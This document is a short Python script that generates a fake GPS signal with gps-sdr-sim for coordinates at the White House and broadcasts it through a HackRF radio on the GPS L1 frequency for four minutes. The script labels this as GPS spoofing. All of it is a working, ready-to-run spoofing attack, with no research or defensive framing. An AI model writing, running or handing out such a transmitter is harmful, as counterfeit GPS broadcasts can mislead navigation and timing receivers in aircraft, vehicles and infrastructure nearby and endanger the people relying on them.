import subprocess
import time
import signal
from datetime import datetime

# Current directory setup
binary_path = "./gps-sdr-sim"
ephemeris_file = "brdc0480.25n" # downloaded from NASA website
location = "38.8976633,-77.0365739,100" # location of White House, can change
duration_seconds = 240  # 4 minutes

try:
    # Make gps-sdr-sim executable
    subprocess.run(["chmod", "+x", binary_path], check=True)

    # Generate gpssim.bin
    subprocess.run(
        [binary_path, "-b", "8", "-e", ephemeris_file, "-l", location],
        stdout=subprocess.DEVNULL, # not printing out any context for running this command
        stderr=subprocess.DEVNULL,
        check=True
    )

    # Transmit via HackRF
    transmit_command = [
        "hackrf_transfer",
        "-t", "gpssim.bin",
        "-f", "1575420000",
        "-s", "2600000",
        "-a", "1",
        "-x", "0"
    ]

    print("Starting GPS spoofing for 4 minutes...")

    process = subprocess.Popen(transmit_command)

    time.sleep(duration_seconds) # waiting for 4 mins

    # Stop the transmission
    process.send_signal(signal.SIGINT)
    process.wait()

    print("Transmission stopped after 4 minutes.")

except subprocess.CalledProcessError as e:
    print(f"Command failed: {e}")
except FileNotFoundError as e:
    print(f"File not found: {e}")
except KeyboardInterrupt:
    print("Interrupted by user. Terminating transmission...")
    if 'process' in locals() and process.poll() is None:
        process.terminate()
        process.wait()
except Exception as e:
    print(f"Unexpected error: {e}")
